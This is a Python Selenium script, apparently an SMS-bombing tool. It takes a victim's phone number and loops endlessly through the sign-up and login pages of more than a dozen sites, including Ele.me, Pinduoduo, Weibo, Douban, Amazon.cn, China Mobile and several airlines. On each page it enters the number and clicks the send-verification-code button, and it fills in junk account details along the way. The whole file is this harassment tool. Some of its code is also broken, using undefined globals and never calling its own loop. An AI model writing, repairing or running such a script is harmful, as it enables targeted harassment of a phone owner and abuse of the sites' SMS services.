from selenium import webdriver
import time
import threading
from selenium.webdriver.chrome.options import Options
class HongZha:
 
    def __init__(self):
        self.phone = phone    # 手机号
        self.num = 0 # 次数，初始值为0
 
    # 发送验证码
    def send_yzm(self, button, name):
        button.click()
        self.num += 1
        print("{}  第{}次  发送成功  {}".format(self.phone, self.num, name))
    # 饿了么
    def ele(self, name):
        driver.get('https://open.shop.ele.me/openapi/register')
        driver.find_element_by_class_name('el-checkbox__inner').click()
        time.sleep(3)
        driver.find_element_by_xpath("//*[@class='el-button btn-next-step el-button--primary']").click()
        time.sleep(4)
        driver.find_element_by_class_name('el-input__inner').send_keys(self.phone)
        button = driver.find_element_by_class_name('btn-verifyCode')
        self.send_yzm(button, name)
    # 瓜子注册接口
    def guazi(self, name):
            try:
                #driver.implicitly_wait(10)
                driver.get("https://www.guazi.com/www/bj/buy")
                a_btn = driver.find_element_by_xpath("//a[@class='uc-my']")
                a_btn.click()
                tel = driver.find_element_by_xpath("//input[@name='phone']")
                tel.send_keys(self.phone)
                button = driver.find_element_by_xpath("//button[@class='get-code']")
                self.send_yzm(button, name)
            except:
                print('faled')
    # 凤凰智信
    def fenghuang(self, name):
        driver.get('https://www.fengwd.com/')
        time.sleep(1)
        driver.find_element_by_xpath("//*[@class='top-bar-item login-tag']/a").click()
        time.sleep(2)
        driver.find_element_by_id('mobile_number').send_keys(self.phone)
        button = driver.find_element_by_xpath("//*[@class='get-sms-captcha blue']")
        time.sleep(4)
        self.send_yzm(button, name)
    # 四川航空
    def sichuanair(self, name):
        driver.get('http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
        driver.find_element_by_name('mobilePhone').send_keys(self.phone)
        time.sleep(1)
        button = driver.find_element_by_id('sendSmsCode')
        time.sleep(6)
        self.send_yzm(button, name)
    # 昆明航空
    def airkunming(self, name):
        driver.get('https://www.airkunming.com/#/user/register')
        driver.find_element_by_id('mobile').send_keys(self.phone)
        time.sleep(1)
        button = driver.find_element_by_xpath("//*[@class='sms-code']")
        time.sleep(4)
        self.send_yzm(button, name)
	# 安徽相亲网
    def anhuixiangqing(self, name):
        driver.get('http://www.ahxiangqin.cn/index.php?c=passport&a=reg')
        driver.find_element_by_name('mobile').send_keys([self.phone])
        time.sleep(1)
        #browser.find_element_by_class_name('action-send-mobile-code get').click()
        button = driver.find_element_by_xpath("//*[@class = 'action-send-mobile-code get']")
        time.sleep(4)
        self.send_yzm(button, name)
    # 唯品会注册接口
    def wphui(self, name):
            driver.get("https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F")
            driver.implicitly_wait(10)
            tel = driver.find_element_by_xpath("//input[@placeholder='请输入手机号码']")
            tel.send_keys(self.phone)
            driver.find_element_by_xpath('//a[contains(./text(),"获取验证码")]').click()
            button = driver.find_element_by_xpath("//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']")
            self.send_yzm(button, name)

    # 拼多多短信登陆接口
    def pinduoduo(self, name):
        driver.get('http://mobile.yangkeduo.com/login.html')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//div[@class="phone-login"]/span').click()
        driver.find_element_by_xpath('//input[@id="user-mobile"]').send_keys(self.phone)
        time.sleep(3)
        button=driver.find_element_by_xpath('//button[@id="code-button"]')
        self.send_yzm(button, name)
 	# 微博
    def weibo(self, name):
        try:
            driver.get('https://weibo.com/signup/signup.php')
            driver.implicitly_wait(10)
            driver.find_elements_by_xpath('//input[@class="tel_num"]')[0].send_keys(self.phone)
            driver.find_element_by_xpath('//input[@class="W_input"]').send_keys('woshinibibi123')
            s = driver.find_element_by_xpath('//select[@class="sel year"]')
            s.find_element_by_xpath('//option[@value="1996"]').click()
            s = driver.find_element_by_xpath('//select[@class="sel month"]')
            s.find_element_by_xpath('//option[@value="1"]').click()
            s = driver.find_element_by_xpath('//select[@class="sel day"]')
            s.find_element_by_xpath('//option[@value="1"]').click()
            button = driver.find_element_by_xpath('//a[@class="W_btn_e"]')
            self.send_yzm(button, name)
        except:
            pass

 	# 印象笔记
    def yinxiang(self, name):
        driver.get('https://static.app.yinxiang.com/embedded-web/registration/index.html?targetUrl=%2FHome.action#/registration')
        driver.implicitly_wait(10)
        driver.find_elements_by_xpath('//input[@class="registration-account-input "]')[0].send_keys(self.phone)
        driver.find_elements_by_xpath('//input[@placeholder="设置密码，至少6位字符"]')[0].send_keys('woshinibaba123123')
        button = driver.find_elements_by_xpath('//div[@class="registration-sms-vercode-btn-validate"]')[0]
        self.send_yzm(button, name)
        time.sleep(3)
 	# 豆瓣
    def douban(self, name):
        driver.get('https://www.douban.com/')
        driver.implicitly_wait(10)
        iframe = driver.find_elements_by_tag_name("iframe")[0]   # 由于要找的input在iframe中，直接定位不到该目标，要先转换到其所在的iframe中才行
        driver.switch_to_frame(iframe)
        driver.find_elements_by_xpath('//input[@name="phone"]')[0].send_keys(self.phone)
        button = driver.find_elements_by_xpath('//div[@class="account-form-field-code"]')[0]
        self.send_yzm(button, name)
        time.sleep(3)
 	# 爱彼迎
    def aibiying(self, name):
        driver.get('https://www.airbnb.cn/?af=43896654&c=.pi9.pkbaidu_brd_brandzone_demand_title_p1&src=Baidu&medium=PPC&ag_kwid=2299-36-57701246c0b98773.6a0cc0f87b49337e')
        driver.implicitly_wait(10)
        driver.find_elements_by_xpath('//div[@class="_18lcoy3z"]')[7].click()  # 顶部导航栏直接定位不到，要先定位导航栏，再逐步定位
        driver.find_elements_by_xpath('//input[@class="_kbzo2td"]')[0].send_keys(self.phone)
        button = driver.find_elements_by_xpath('//button[@class="_1wficfyg"]')[0]
        self.send_yzm(button, name)
        time.sleep(3)
    # 中国移动
    def yidong(self,name):
        driver.get('https://login.10086.cn/login.html')
        driver.implicitly_wait(8)
        driver.find_element_by_xpath('//*[@id="sms_login_1"]').click()
        driver.find_element_by_xpath('//*[@id="sms_name"]').send_keys(self.phone)
        button = driver.find_element_by_id('getSMSPwd1')
        self.send_yzm(button, name)
        time.sleep(3)
    # 51book
    def func3(self,name):
        driver.get('http://caigou.51book.com/caigou/manage/designatedRegistryNewSignon.in')
        driver.find_element_by_xpath('//*[@id="cg_06"]').send_keys(self.phone)
        button = driver.find_element_by_id('sendMSgBtu')
        self.send_yzm(button, name)
        time.sleep(3)
   # 亚马逊
    def func6(self,name):
        driver.get('https://www.amazon.cn/ap/register?_encoding=UTF8&openid.assoc_handle=cnflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.cn%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_newcust')
        # driver.find_element_by_xpath('//*[@id="nav-flyout-ya-newCust"]/a').click()
        driver.find_element_by_xpath('//*[@id="ap_customer_name"]').send_keys('Mike998')
        driver.find_element_by_xpath('//*[@id="ap_phone_number"]').send_keys(self.phone)
        driver.find_element_by_xpath('//*[@id="ap_password"]').send_keys('pwd123456')
        driver.find_element_by_xpath('//*[@id="ap_register_form"]/div/div/div[5]/div/label/input').click()
        button = driver.find_element_by_xpath('//*[@id="continue"]')
        self.send_yzm(button, name)
        time.sleep(3)
     # 唯品会
    def func11(self,name):
        driver.get('https://passport.vip.com/register')
        driver.find_element_by_xpath('//*[@id="J_mobile_name"]').send_keys(self.phone)
        button = driver.find_element_by_xpath('//*[@id="J_mobile_verifycode_btn"]')
        self.send_yzm(button, name)
        time.sleep(3)
    # 循环执行
    def main(self):
        while True:
            self.ele('饿了么')
            time.sleep(3)
            self.fenghuang('凤凰')
            time.sleep(3)            
            self.guazi('瓜子')
            time.sleep(3)
            self.pinduoduo('拼多多')
            time.sleep(3)
            self.sichuanair("四川航空")
            time.sleep(3)
            self.airkunming("昆明航空")
            time.sleep(3)
            self.anhuixiangqing('安徽相亲网')
            time.sleep(3)            
            self.weibo('微博')
            time.sleep(3)
            self.yinxiang('印象笔记')
            time.sleep(3)
            self.douban('豆瓣')
            time.sleep(3)
            self.yidong('中国移动')
            time.sleep(3)
            self.func3('51book')
            time.sleep(3)
            self.func6('亚马逊')
            time.sleep(3)
            self.func11('唯品会')
            time.sleep(3)
            time.sleep(30) # 睡30s后循环执行
 
 
def main():
    # 路径修改为自己的路径！！！
    # 路径修改为自己的路径！！！
    # 路径修改为自己的路径！！！
    
    options = Options()
    options.binary_location = r"C:\Users\Administrator\Downloads\Chrome-bin/chrome.exe"   # 这里是你指定浏览器的路径
    driver = webdriver.Chrome(options=options) 
    hongzha = HongZha()
if __name__ == '__main__':
    print('我只能发送100条，在下方输入你想发短信的号码！')
    phone = input('输入号码： ')
    for i in range(2):
        t = threading.Thread(target=main)
        t.setDaemon(True)
        t.start()
